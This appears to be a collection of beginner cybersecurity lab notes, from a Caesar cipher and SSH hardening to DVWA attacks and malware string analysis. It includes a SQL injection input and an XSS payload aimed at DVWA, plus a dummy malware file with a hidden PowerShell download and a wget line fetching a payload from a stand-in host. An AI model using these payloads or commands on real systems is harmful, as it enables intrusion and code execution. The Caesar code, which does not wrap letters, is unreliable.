# 🔐 **Cybersecurity Labs Collection**

**Complete hands-on labs** covering **cryptography, Linux security, web vulnerabilities, network analysis, cloud security, and more**.


## 1. **Caesar Cipher**

**Encrypt "HELLO" → "LIPPS"** and decrypt ciphertext with Python.

```python
def caesar(text, shift):
    result = ""
    for ch in text:
        if ch.isalpha():
            result += chr(ord(ch) + shift)
        else:
            result += ch
    return result

# Usage
choice = input("Enter choice (encrypt / decrypt): ")
text = input("Enter text: ")
shift = int(input("Enter shift value: "))

if choice == "encrypt":
    print("Encrypted:", caesar(text, shift))
elif choice == "decrypt":
    print("Decrypted:", caesar(text, -shift))
```

**Example:** `HELLO` + shift 4 → `LIPPS`

***

## 2. **RSA Keys (OpenSSL)**

**Generate 2048-bit RSA key pair** in **PEM format** (Windows).

```cmd
"C:\Program Files\OpenSSL-Win64\bin\openssl.exe" version
"C:\Program Files\OpenSSL-Win64\bin\openssl.exe" genrsa -out private_key.pem 2048
"C:\Program Files\OpenSSL-Win64\bin\openssl.exe" rsa -in private_key.pem -pubout -out public_key.pem
type private_key.pem
type public_key.pem
```

**PEM Format:** `-----BEGIN RSA PRIVATE KEY-----` + Base64 + `-----END-----`

***

## 3. **Linux User Permissions**

**Create 2 users** - only `person1` accesses `secure.txt`.

```bash
sudo useradd person1 && sudo passwd person1  # password: person1
sudo useradd person2 && sudo passwd person2  # password: person2
touch secure.txt
sudo chown person1:person1 secure.txt
chmod 600 secure.txt
ls -l  # -rw------- 1 person1 person1

su person1  # cat/nano works
su person2  # Permission denied!
```

***

## 4. **Disable SSH Root**

**Prevent root brute-force attacks**.

```bash
sudo nano /etc/ssh/sshd_config
# PermitRootLogin no

sudo systemctl restart ssh
sudo sshd -T | grep permitrootlogin  # permitrootlogin no
ssh root@your_server_ip  # Permission denied!
```

***

## 5. **OpenVPN Setup**

**Connect VPNBook** - verify IP change.

```bash
curl ifconfig.me  # Real IP
sudo apt install openvpn -y
cd ~/Downloads/vpnbook-openvpn-fr200
sudo openvpn vpnbook-fr200-tcp80.ovpn  # vpnbook/[password from vpnbook.com]
# NEW terminal:
curl ifconfig.me  # France IP!
```

***

## 6. **Nmap Port Scanning**

**Scan `scanme.nmap.org`** - identify services.

```bash
nmap scanme.nmap.org
# 22/tcp open  ssh     (Secure Shell)
# 80/tcp open  http    (Web server)  
# 9929/tcp open nping-echo
```

***

## 7. **DVWA SQL Injection**

**Setup DVWA** → **Extract all users**.

```bash
# Install + Setup (see full steps above)
sudo git clone https://github.com/digininja/DVWA.git /var/www/html/dvwa
# Database: user=dvwa, pass=p@ssw0rd
# Firefox: http://localhost/dvwa

# Attack (Low security):
User ID: 1' OR '1'='1  # Dumps ALL users!
```

***

## 8. **DVWA XSS Attack**

**Inject JavaScript** in reflected XSS.

```
DVWA → XSS (Reflected) → Low
Name: <script>alert('XSS');</script>
# Popup: XSS  ✅
```

***

## 9. **Domain Analysis**

**Whois + DNS lookup**.

```bash
whois example.com
# Domain: EXAMPLE.COM, Created: 1995-08-14

nslookup example.com
# Address: 93.184.216.34

nslookup
> set type=NS
> example.com  # Name servers
> exit
```

***

## 10. **Malware Strings**

**Extract C2 servers** from malware.

```bash
cat << 'EOF' > dummy_malware.bin
http://malicious-website.com/command
powershell -nop -w hidden -c Invoke-WebRequest
wget http://evil-remote-server.com/payload
192.168.0.10
EOF

strings dummy_malware.bin | grep http  # C2 URLs
strings dummy_malware.bin | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'  # IPs
```

**Findings:** `malicious-website.com`, `192.168.0.10`

***

## 11. **Breach Simulation**

**Malicious script** + **auditd tracking**.

```bash
nano breach.sh  # Creates files in /tmp
chmod +x breach.sh
sudo apt install auditd -y
sudo auditctl -w /tmp -p war -k breach_monitor
./breach.sh
sudo ausearch -k breach_monitor
ls /tmp  # secret_data.txt, hidden_folder
```

***

## 12. **SSH Log Analysis**

**Detect brute-force attacks**.

```bash
sudo journalctl _COMM=sshd | grep "Failed password" | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort | uniq -c | sort -nr
# 47 192.168.1.100  ← BLOCK THIS!
```

***

## 13. **AWS EC2 Security**

**Security Group:** HTTP(80) + SSH(22) **only**.

```
Inbound Rules:
✓ HTTP 80   0.0.0.0/0
✓ SSH  22   0.0.0.0/0
✗ All others BLOCKED

nmap your-ec2-ip  # Only 22,80 open
```

***

## 14. **IoT Wireshark**

**RPi + ESP32** → **Unsecured HTTP/UDP** captured.

```
ESP32: HTTP api.ipify.org  (Plaintext!)
RPi:  UDP broadcast        (No encryption!)
Wireshark: wlan0mon filter "http or udp"
```

***

## 🎯 **Summary**

| Lab | Skill | Key Command |
|-----|-------|-------------|
| Caesar | Cryptography | `caesar(text, 4)` |
| RSA | PKI | `openssl genrsa` |
| Permissions | Linux | `chmod 600` |
| SSH | Hardening | `PermitRootLogin no` |
| VPN | Networking | `openvpn .ovpn` |
| Nmap | Recon | `nmap scanme.nmap.org` |
| SQLi | Web | `1' OR '1'='1` |
| XSS | Web | `<script>alert('XSS')</script>` |
| Whois | OSINT | `whois example.com` |
| Strings | Malware | `strings malware.bin \| grep http` |
| Audit | Forensics | `ausearch -k breach` |
| Logs | SIEM | `journalctl \| grep Failed` |
| AWS | Cloud | Security Groups |
| IoT | Analysis | `wireshark wlan0mon` |
